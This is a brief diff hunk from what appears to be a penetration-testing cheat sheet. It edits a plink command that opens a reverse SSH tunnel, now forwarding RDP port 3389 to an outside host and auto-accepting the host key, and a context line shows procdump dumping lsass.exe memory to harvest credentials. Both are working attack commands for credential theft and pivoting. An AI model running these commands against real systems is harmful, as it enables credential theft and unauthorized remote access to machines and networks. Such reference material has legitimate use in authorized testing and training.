@@ -593,7 +593,7 @@ C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For 64 bits
 
 ```
 Forward remote port to local address
-plink.exe -P 22 -l root -pw "1234" -R 445:127.0.0.1:445 IP
+cmd.exe /c echo y | .\plink.exe -P 22 -l <USER> -pw "password" -R 3389:127.0.0.1:3389 <IP> 2>&1
 ```
 
 ### Meterpreter portfwd
